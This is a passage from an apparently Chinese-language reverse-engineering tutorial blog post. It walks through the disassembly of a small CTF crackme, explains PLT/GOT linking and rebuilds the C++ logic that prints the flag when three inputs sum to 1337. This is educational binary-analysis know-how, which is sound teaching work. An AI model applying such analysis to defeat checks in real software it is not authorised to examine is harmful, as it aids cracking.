&amp;lt;+39&gt;:	call   0x400830 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;&lt;br&gt;   0x0000000000400b4a &amp;lt;+44&gt;:	lea    rax,[rbp-0xc]&lt;br&gt;   0x0000000000400b4e &amp;lt;+48&gt;:	mov    rsi,rax&lt;br&gt;   0x0000000000400b51 &amp;lt;+51&gt;:	mov    edi,0x602080&lt;br&gt;   0x0000000000400b56 &amp;lt;+56&gt;:	call   0x400850 &amp;lt;_ZNSirsERi@plt&gt;&lt;br&gt;   0x0000000000400b5b &amp;lt;+61&gt;:	lea    rdx,[rbp-0x10]&lt;br&gt;   0x0000000000400b5f &amp;lt;+65&gt;:	mov    rsi,rdx&lt;br&gt;   0x0000000000400b62 &amp;lt;+68&gt;:	mov    rdi,rax&lt;br&gt;   0x0000000000400b65 &amp;lt;+71&gt;:	call   0x400850 &amp;lt;_ZNSirsERi@plt&gt;&lt;br&gt;   0x0000000000400b6a &amp;lt;+76&gt;:	lea    rdx,[rbp-0x14]&lt;br&gt;   0x0000000000400b6e &amp;lt;+80&gt;:	mov    rsi,rdx&lt;br&gt;   0x0000000000400b71 &amp;lt;+83&gt;:	mov    rdi,rax&lt;br&gt;   0x0000000000400b74 &amp;lt;+86&gt;:	call   0x400850 &amp;lt;_ZNSirsERi@plt&gt;&lt;br&gt;   0x0000000000400b79 &amp;lt;+91&gt;:	mov    edx,DWORD PTR [rbp-0xc]&lt;br&gt;   0x0000000000400b7c &amp;lt;+94&gt;:	mov    eax,DWORD PTR [rbp-0x10]&lt;br&gt;   0x0000000000400b7f &amp;lt;+97&gt;:	add    edx,eax&lt;br&gt;   0x0000000000400b81 &amp;lt;+99&gt;:	mov    eax,DWORD PTR [rbp-0x14]&lt;br&gt;   0x0000000000400b84 &amp;lt;+102&gt;:	add    eax,edx&lt;br&gt;   0x0000000000400b86 &amp;lt;+104&gt;:	mov    edi,eax&lt;br&gt;   0x0000000000400b88 &amp;lt;+106&gt;:	call   0x40094d &amp;lt;_Z3geni&gt;&lt;br&gt;   0x0000000000400b8d &amp;lt;+111&gt;:	mov    QWORD PTR [rbp-0x8],rax&lt;br&gt;   0x0000000000400b91 &amp;lt;+115&gt;:	mov    edx,DWORD PTR [rbp-0xc]&lt;br&gt;   0x0000000000400b94 &amp;lt;+118&gt;:	mov    eax,DWORD PTR [rbp-0x10]&lt;br&gt;   0x0000000000400b97 &amp;lt;+121&gt;:	add    edx,eax&lt;br&gt;   0x0000000000400b99 &amp;lt;+123&gt;:	mov    eax,DWORD PTR [rbp-0x14]&lt;br&gt;   0x0000000000400b9c &amp;lt;+126&gt;:	add    eax,edx&lt;br&gt;   0x0000000000400b9e &amp;lt;+128&gt;:	cmp    eax,0x539&lt;br&gt;   0x0000000000400ba3 &amp;lt;+133&gt;:	jne    0x400bcc &amp;lt;main+174&gt;&lt;br&gt;   0x0000000000400ba5 &amp;lt;+135&gt;:	mov    esi,0x400ce6&lt;br&gt;   0x0000000000400baa &amp;lt;+140&gt;:	mov    edi,0x6021a0&lt;br&gt;   0x0000000000400baf &amp;lt;+145&gt;:	call   0x400830 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;&lt;br&gt;   0x0000000000400bb4 &amp;lt;+150&gt;:	mov    rax,QWORD PTR [rbp-0x8]&lt;br&gt;   0x0000000000400bb8 &amp;lt;+154&gt;:	mov    rdi,rax&lt;br&gt;   0x0000000000400bbb &amp;lt;+157&gt;:	call   0x400ae3 &amp;lt;_Z9print_ptrPc&gt;&lt;br&gt;   0x0000000000400bc0 &amp;lt;+162&gt;:	mov    edi,0x400cef&lt;br&gt;   0x0000000000400bc5 &amp;lt;+167&gt;:	call   0x4007c0 &amp;lt;puts@plt&gt;&lt;br&gt;   0x0000000000400bca &amp;lt;+172&gt;:	jmp    0x400bdb &amp;lt;main+189&gt;&lt;br&gt;   0x0000000000400bcc &amp;lt;+174&gt;:	mov    esi,0x400cf1&lt;br&gt;   0x0000000000400bd1 &amp;lt;+179&gt;:	mov    edi,0x6021a0&lt;br&gt;   0x0000000000400bd6 &amp;lt;+184&gt;:	call   0x400830 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;&lt;br&gt;   0x0000000000400bdb &amp;lt;+189&gt;:	mov    rax,QWORD PTR [rbp-0x8]&lt;br&gt;   0x0000000000400bdf &amp;lt;+193&gt;:	mov    rdi,rax&lt;br&gt;   0x0000000000400be2 &amp;lt;+196&gt;:	call   0x400840 &amp;lt;free@plt&gt;&lt;br&gt;   0x0000000000400be7 &amp;lt;+201&gt;:	mov    eax,0x0&lt;br&gt;   0x0000000000400bec &amp;lt;+206&gt;:	leave  &lt;br&gt;   0x0000000000400bed &amp;lt;+207&gt;:	ret    &lt;br&gt;End of assembler dump.&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;哇，這些密密麻麻的怎麼看？！從第一行開始讀嗎？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;首先，最重要的是理出邏輯，也就是要辨別『用了哪些函數』跟『經過哪些判斷式』。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;『用了哪些函數』簡單，只要找出所有的 &lt;code&gt;call&lt;/code&gt; 指令就行了。上面用到的就有好幾個，例如好短的 &lt;code&gt;&amp;lt;_Z3geni&amp;gt;&lt;/code&gt; &lt;code&gt;&amp;lt;puts@plt&amp;gt;&lt;/code&gt;跟這個好長的&lt;code&gt;&amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;&lt;/code&gt;。有人可能會發現，怎麼有些函數後面加了一個 &lt;code&gt;@plt&lt;/code&gt; 呢？&lt;/p&gt;
&lt;p&gt;這裡要先講『函數』是怎麼被儲存跟存取的。寫過一點程式的人應該都用過一些 standard library 或是第三方函式庫，有沒有想過程式執行起來的時候怎麼抓到或引用這些外部函數呢？&lt;/p&gt;
&lt;h3 id=&quot;linking&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#linking&quot;&gt;#&lt;/a&gt; Linking&lt;/h3&gt;
&lt;p&gt;在編譯程式碼的時候，有 dynamic linking 和 static linking 兩種方法，簡單對比的話，dynamic linking 就是只把作者自己定義的函數跟邏輯包進執行檔，而 static linking 則會把外部引用的函數一起包進去。所以 static linking 產生的檔案會大很多，而 dynamic linking 則會需要檔案執行者本機上的函示庫支援。到了執行的時候，statically linked 的檔案就可以直接在執行檔裡找到函數，dynamically linked 則是在程式跑起來的時候，作業系統才會做 linking，把各個要調用的外部函數的位置填到這隻程式的一張表裡，方便執行時查詢呼叫。剛剛說要『填入的一張表』就是 GOT（Global Offsets Table），是一個可讀可寫的記憶體空間；而 PLT（Procedure Linkage Table）就是『執行時查詢呼叫』的另一張表，是一個可讀可執行的記憶體空間。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-02/plt-got.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;GOT PLT table&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我們用上面這張圖簡單說明一下。&lt;/p&gt;
&lt;p&gt;當程式跑起來時，dynamic linker 會做幾件事：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;把引用到的外部檔案 load 到 memory&lt;/li&gt;
&lt;li&gt;創建 PLT 與 GOT，PLT 中的欄位指向對應的 GOT 欄位&lt;/li&gt;
&lt;li&gt;在 GOT 欄位中放入一個 default stub（可以先想成是一個機關）。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第一次遇到 &lt;code&gt;call func@plt&lt;/code&gt; 的指令時，程式就會戳到 GOT 欄位裡的 default stub，觸發機關使 dynamic linker 依據剛剛 load 進來的函式庫跟 &lt;code&gt;func&lt;/code&gt; 在外部檔案中的 offset 算出此時 &lt;code&gt;func&lt;/code&gt; 在記憶體中的位置並且填入表中，變成下面那張圖的樣子。此後，任何的 &lt;code&gt;call func@plt&lt;/code&gt; 指令就會順利呼叫到 &lt;code&gt;0x7fff12b0&lt;/code&gt; 這個位置的函數啦！&lt;/p&gt;
&lt;p&gt;以上是一個非常簡略的介紹，其實 linker 的機制還有非常多細節，有興趣的可以參考大佬 &lt;a href=&quot;https://www.airs.com/blog/archives/41&quot;&gt;Ian Lance Taylor 的一系列文章&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;不過經過這個簡略的介紹，大家可以記得兩件事：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GOT 可寫，PLT 可執行&lt;/li&gt;
&lt;li&gt;通常用 &lt;code&gt;@plt&lt;/code&gt; 呼叫的指令是外部函數，常常是標準函式庫，看不懂可以直接 google 查詢，都找得到詳盡的文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;function-calls&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#function-calls&quot;&gt;#&lt;/a&gt; Function calls&lt;/h3&gt;
&lt;p&gt;好的，那上面 &lt;code&gt;main&lt;/code&gt;的函數有哪些呢？又是什麼意思呢？幫你查好了！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&lt;/code&gt;：basic &lt;code&gt;ostream&lt;/code&gt;，也就是 &lt;code&gt;cout&lt;/code&gt; 用到的 &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_ZNSirsERi@plt&lt;/code&gt;：&lt;code&gt;istream&lt;/code&gt;，也就是 &lt;code&gt;cin&lt;/code&gt; 用到的&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_Z3geni&lt;/code&gt;：作者自定義的函數，看起來本來是 &lt;code&gt;gen()&lt;/code&gt;，應該是用來產生 flag 的函數&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_Z9print_ptrPc&lt;/code&gt;：作者自定義的函數，看起來本來是 &lt;code&gt;print_ptr()&lt;/code&gt;，應該是印出某些東西&lt;/li&gt;
&lt;li&gt;&lt;code&gt;puts@plt&lt;/code&gt;：libc &lt;code&gt;put&lt;/code&gt; function&lt;/li&gt;
&lt;li&gt;&lt;code&gt;free@plt&lt;/code&gt;：libc &lt;code&gt;free&lt;/code&gt; function&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;小提示：判別函數除了查詢之外，也可以從剛剛的 assembly 看出一點端倪！我們知道函數接收參數是用 &lt;code&gt;rdi&lt;/code&gt; &lt;code&gt;rsi&lt;/code&gt; ，那就可以把一些已知位置的記憶體印出來。&lt;/p&gt;
&lt;p&gt;例如 &lt;code&gt;main+39&lt;/code&gt; 的 &lt;code&gt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc&lt;/code&gt; 前面是 &lt;code&gt;mov esi,0x400cd0; mov edi,0x6021a0&lt;/code&gt;， &lt;code&gt;main+56&lt;/code&gt; 的 &lt;code&gt;_ZNSirsERi&lt;/code&gt; 前面是 &lt;code&gt;mov edi,0x602080&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-02/cin-cout.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;cin cout&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最後 &lt;code&gt;main+145&lt;/code&gt; 的 &lt;code&gt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc&lt;/code&gt; 前面是 &lt;code&gt;mov esi,0x400ce6; mov edi,0x6021a0&lt;/code&gt;， &lt;code&gt;main+167&lt;/code&gt; 的 &lt;code&gt;puts@plt&lt;/code&gt; 前面是 &lt;code&gt;mov edi,0x400cef&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-02/flag-cout.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;print flag&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;標準函式庫的參數都可以在文件上查到，只要對應著前一篇提過的 register 的順序就可以推敲出每塊資料的意義了喔！&lt;/p&gt;
&lt;h3 id=&quot;conditionals&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#conditionals&quot;&gt;#&lt;/a&gt; Conditionals&lt;/h3&gt;
&lt;p&gt;再來判別程式的邏輯，最重要的就是找出 &lt;code&gt;cmp&lt;/code&gt; 指令並回推必要的條件。以下節錄判斷邏輯，省略的部分跟函數呼叫我用註解寫上他們的功能。&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;Dump of assembler code for function main:&lt;br&gt;   .....snip...... # setup and print prompt  &lt;br&gt;   0x0000000000400b4a &amp;lt;+44&gt;:	lea    rax,[rbp-0xc]&lt;br&gt;   0x0000000000400b4e &amp;lt;+48&gt;:	mov    rsi,rax&lt;br&gt;   0x0000000000400b51 &amp;lt;+51&gt;:	mov    edi,0x602080&lt;br&gt;   0x0000000000400b56 &amp;lt;+56&gt;:	call   0x400850 &amp;lt;_ZNSirsERi@plt&gt;    # cin to [rbp-0xc] &lt;br&gt;   0x0000000000400b5b &amp;lt;+61&gt;:	lea    rdx,[rbp-0x10]&lt;br&gt;   0x0000000000400b5f &amp;lt;+65&gt;:	mov    rsi,rdx&lt;br&gt;   0x0000000000400b62 &amp;lt;+68&gt;:	mov    rdi,rax&lt;br&gt;   0x0000000000400b65 &amp;lt;+71&gt;:	call   0x400850 &amp;lt;_ZNSirsERi@plt&gt;    # cin to [rbp-0x10]&lt;br&gt;   0x0000000000400b6a &amp;lt;+76&gt;:	lea    rdx,[rbp-0x14]&lt;br&gt;   0x0000000000400b6e &amp;lt;+80&gt;:	mov    rsi,rdx&lt;br&gt;   0x0000000000400b71 &amp;lt;+83&gt;:	mov    rdi,rax&lt;br&gt;   0x0000000000400b74 &amp;lt;+86&gt;:	call   0x400850 &amp;lt;_ZNSirsERi@plt&gt;    # cin to [rbp-0x14]&lt;br&gt;   .....snip...... # generate something from input&lt;br&gt;   0x0000000000400b91 &amp;lt;+115&gt;:	mov    edx,DWORD PTR [rbp-0xc]&lt;br&gt;   0x0000000000400b94 &amp;lt;+118&gt;:	mov    eax,DWORD PTR [rbp-0x10]&lt;br&gt;   0x0000000000400b97 &amp;lt;+121&gt;:	add    edx,eax&lt;br&gt;   0x0000000000400b99 &amp;lt;+123&gt;:	mov    eax,DWORD PTR [rbp-0x14]&lt;br&gt;   0x0000000000400b9c &amp;lt;+126&gt;:	add    eax,edx&lt;br&gt;   0x0000000000400b9e &amp;lt;+128&gt;:	cmp    eax,0x539                    # compare to 1337!&lt;br&gt;   0x0000000000400ba3 &amp;lt;+133&gt;:	jne    0x400bcc &amp;lt;main+174&gt;&lt;br&gt;   .....snip...... # success, print flag&lt;br&gt;   0x0000000000400bcc &amp;lt;+174&gt;:	mov    esi,0x400cf1                 # &#39;nope.&#39;&lt;br&gt;   0x0000000000400bd1 &amp;lt;+179&gt;:	mov    edi,0x6021a0&lt;br&gt;   0x0000000000400bd6 &amp;lt;+184&gt;:	call   0x400830 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;&lt;br&gt;   .....snip...... # clean up, free buffer&lt;br&gt;   0x0000000000400bec &amp;lt;+206&gt;:	leave  &lt;br&gt;   0x0000000000400bed &amp;lt;+207&gt;:	ret  &lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先注意到 &lt;code&gt;main+128&lt;/code&gt; 的 &lt;code&gt;cmp eax,0x539&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;下一行的 &lt;code&gt;jne 0x400bcc &amp;lt;main+174&amp;gt;&lt;/code&gt; 告訴我們，如果 &lt;code&gt;eax&lt;/code&gt; 的值不是 1337（把十六進位轉成十進位），那邏輯就會跳到 &lt;code&gt;main+174&lt;/code&gt;，也就是印出失敗字串 “nope.” 的地方，所以我們的目標是讓：&lt;code&gt;eax=1337&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;往回推，&lt;code&gt;eax=eax+edx (main+126)&lt;/code&gt;，又本來的 &lt;code&gt;eax=[rbp-0x14] (main+123)&lt;/code&gt;、本來的&lt;code&gt;edx=edx+eax=[rbp-0xc]+[rbp-0x10] (main+115~121)&lt;/code&gt;，也就是說，最後 &lt;code&gt;eax&lt;/code&gt; 的值其實就是 &lt;code&gt;[rbp-0x14]+[rbp-0xc]+[rbp-0x10]&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;那這三個記憶體又是哪來的呢？&lt;/p&gt;
&lt;p&gt;再往前看一些你就會發現，這三塊其實就是 &lt;code&gt;cin&lt;/code&gt; 吃進來的三個數字，也就是我們一開始輸入的值呀！往上看到一進入 &lt;code&gt;main&lt;/code&gt; 的前幾行，有把這三塊記憶體清空的指令，其實就是把這三個 4 byte 大小的 int 區域變數初始化為 0 的舉動。&lt;/p&gt;
&lt;p&gt;其實到這裡，這一題就已經解完了。我們只要輸入任意三個相加為 1337 的數字就可以成功拿到 flag 了！&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-02/reversed.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;reversed&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;根據上面的分析，我們可以手動還原 &lt;code&gt;main&lt;/code&gt;的 cpp code。建議你可以先自己試試看，練習完再來看下面這段！&lt;/p&gt;
&lt;pre class=&quot;language-cpp&quot;&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; flag&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    std&lt;span class=&quot;token double-colon punctuation&quot;&gt;::&lt;/span&gt;cout &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Enter three numbers!&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span class=&quot;token double-colon punctuation&quot;&gt;::&lt;/span&gt;endl&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    std&lt;span class=&quot;token double-colon punctuation&quot;&gt;::&lt;/span&gt;cin &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; b &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; c &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; b&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;gen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        std&lt;span class=&quot;token double-colon punctuation&quot;&gt;::&lt;/span&gt;cout &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;FLAG{&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;print_ptr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        std&lt;span class=&quot;token double-colon punctuation&quot;&gt;::&lt;/span&gt;cout &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;that%E2%80%99s-it%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#that%E2%80%99s-it%3F&quot;&gt;#&lt;/a&gt; That’s it?&lt;/h3&gt;
&lt;p&gt;就這樣了嗎？是不是有點空虛？我們都還沒看過自定義的函數呢！&lt;/p&gt;
&lt;p&gt;為了物盡其用，我們拿簡單的 &lt;code&gt;print_ptr()&lt;/code&gt; 來看一下『迴圈』長什麼樣子。&lt;/p&gt;
&lt;p&gt;從頭 trace 一下，略過前面 function prologue，在 &lt;code&gt;+8&lt;/code&gt; 的地方把參數 &lt;code&gt;rdi&lt;/code&gt; 放到 &lt;code&gt;rbp-0x18&lt;/code&gt;，然後把 &lt;code&gt;rbp-0x4&lt;/code&gt; 設成 0。接著，邏輯跳到 &lt;code&gt;+51&lt;/code&gt; 的地方，這時我們才剛把 &lt;code&gt;rbp-0x4&lt;/code&gt; 設成 0，跟 0x14 做比較當然 &lt;code&gt;jle&lt;/code&gt;(&lt;strong&gt;j&lt;/strong&gt;ump if &lt;strong&gt;l&lt;/strong&gt;ess than or &lt;strong&gt;e&lt;/strong&gt;qual)會成立，然後跳回到 &lt;code&gt;+21&lt;/code&gt; 的地方，最後呼叫 &lt;code&gt;putchar@plt (+42)&lt;/code&gt;。字元印出來後，會把 &lt;code&gt;rbp-0x4&lt;/code&gt; 加 1，然後繼續判斷是否大於 0x14，否則再度跳回 &lt;code&gt;+21&lt;/code&gt; 呼叫 &lt;code&gt;putchar@plt (+42)&lt;/code&gt;。這個『加一、判斷』的循環會一直持續到 &lt;code&gt;rbp-0x4=0x15&lt;/code&gt; 為止，然後整個函數就會結束。&lt;/p&gt;
&lt;p&gt;聰明的你一定發現了，&lt;code&gt;rbp-0x4&lt;/code&gt; 根本就是一個計數器（counter），這一整段程式跳來跳去其實就是為了重複執行 &lt;code&gt;+21&lt;/code&gt; 到 &lt;code&gt;+42&lt;/code&gt; 的部分，跑一個 0x15 次（0 到 0x14）的迴圈逐個印出 &lt;code&gt;gen()&lt;/code&gt; 產生的 flag 的每一個字元。因爲實在太短了，我直接把還原的 cpp 寫在這：&lt;/p&gt;
&lt;pre class=&quot;language-cpp&quot;&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;  &lt;br&gt;    &lt;span class=&quot;token function&quot;&gt;put_char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這種很短的『加減＋判斷＋ jump』組合，常常都是迴圈的邏輯喔！&lt;/p&gt;
&lt;p&gt;再來看看這題最複雜的 &lt;code&gt;gen()&lt;/code&gt;，因為他的組語太長我就不放上來了，請自己操作配著以下敘述觀察思考。&lt;code&gt;gen()&lt;/code&gt; 的邏輯是先用 &lt;code&gt;malloc()&lt;/code&gt; 拿到一塊記憶體，然後使用參數值，也就是三個數字的總和（就是 1337 啦）進行一些運算來產生 flag。小提醒：字串是由許多連續的字元或位元構成，因此我們可以用『字串頭的記憶體位置』加上『第幾個字元』來做 string indexing。&lt;/p&gt;
&lt;p&gt;有興趣多練習的人可以試著自己 reverse 看看 &lt;code&gt;gen()&lt;/code&gt;，我在這裡也附上參考的 cpp code 還有 ascii decode 結果。&lt;/p&gt;
&lt;pre class=&quot;language-cpp&quot;&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;gen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// 0x16 = 22 (dec)&lt;/span&gt;&lt;br&gt;  &lt;br&gt;    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;121&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                           &lt;span class=&quot;token comment&quot;&gt;// 0x79 = 121     -&gt; &#39;y&#39;&lt;/span&gt;&lt;br&gt;    result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span 